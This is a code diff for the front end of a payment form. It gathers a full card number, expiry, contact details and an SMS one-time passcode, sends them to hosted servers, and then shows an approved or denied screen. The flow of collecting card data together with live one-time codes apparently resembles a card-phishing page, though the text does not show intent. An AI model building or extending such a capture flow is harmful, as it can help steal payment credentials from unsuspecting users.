@@ -232,7 +232,7 @@
     otpStatus.textContent = "Verifying...";
     otpStatus.style.color = "";
     try {
-      // Call your server proxy so the server caches the verification
+      // Verify via status server proxy (which also caches)
       const res = await fetch('https://twist-status-server.onrender.com/otp/verify-proxy', {
         method:'POST', headers:{'Content-Type':'application/json'},
         body: JSON.stringify({ phone: lockedPhone, code })
@@ -242,6 +242,7 @@
         otpStatus.textContent = "✅ OTP verified!";
         otpStatus.style.color = "green";
         submitBtn.disabled = false;
+        phoneEl.readOnly = true; // lock phone after success
       } else {
         otpStatus.textContent = `❌ Invalid OTP${data.error ? ' – ' + data.error : ''}`;
         otpStatus.style.color = "red";
@@ -254,7 +255,7 @@
     }
   };
 
-  /* ------------ Submit ------------ */
+  /* ------------ Submit (NEW: single-shot server validation) ------------ */
   function showErr(msg) {
     clientErr.textContent = msg;
     clientErr.classList.remove('hidden');
@@ -281,53 +282,37 @@
       cardNumber: rawCard,                // 14 digits
       expiration: expEl.value,            // MMYY
       twist: twistEl.value,
-      name: document.getElementById('name').value,
-      email: document.getElementById('email').value,
+      name: document.getElementById('name').value.trim(),
+      email: document.getElementById('email').value.trim(),
       phone: lockedPhone,                 // EXACT same phone used for OTP
-      postal: document.getElementById('postal').value,
-      address: document.getElementById('address').value,
-      city: document.getElementById('city').value,
-      otpCode: document.getElementById('otpCode').value
+      postal: document.getElementById('postal').value.trim(),
+      address: document.getElementById('address').value.trim(),
+      city: document.getElementById('city').value.trim(),
+      otpCode: otpEl.value
     };
 
     document.getElementById('loadingSpinner').classList.remove('hidden');
 
     try {
-      const pre = await fetch('https://twist-status-server.onrender.com/pre-validate', {
+      // NEW: call server-side validator that checks logs + code.json and posts /store-status on approval
+      const resp = await fetch('https://twist-status-server.onrender.com/validate-transaction', {
         method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
       });
-      const preData = await pre.json();
-      if (!pre.ok || !preData?.ok) {
-        document.getElementById('loadingSpinner').classList.add('hidden');
-        return showErr(preData?.message || 'Validation failed.');
-      }
+      const data = await resp.json();
 
-      await fetch('https://form-backend-p44w.onrender.com/submit-payment', {
-        method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
-      });
-
+      // Move to waiting screen (same UX) and then reveal result
       document.getElementById('paymentForm').classList.add('hidden');
       document.getElementById('confirmationStep').classList.remove('hidden');
       document.getElementById('loadingSpinner').classList.add('hidden');
 
-      let attempts = 0;
-      const interval = setInterval(async () => {
-        attempts++;
-        const res = await fetch('https://twist-status-server.onrender.com/client-check-status', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ transaction_id: transactionId })
-        });
-        const data = await res.json();
-        if (data.status === 'approved') {
-          clearInterval(interval);
-          document.getElementById('confirmationStep').classList.add('hidden');
+      setTimeout(() => {
+        document.getElementById('confirmationStep').classList.add('hidden');
+        if (data && data.ok && data.status === 'approved') {
           document.getElementById('confirmationSuccess').classList.remove('hidden');
-        } else if (attempts >= 18) {
-          clearInterval(interval);
-          document.getElementById('confirmationStep').classList.add('hidden');
+        } else {
           document.getElementById('confirmationDenied').classList.remove('hidden');
         }
-      }, 5000);
+      }, 1200);
     } catch (err) {
       document.getElementById('loadingSpinner').classList.add('hidden');
       showErr("Network error: " + err.message);
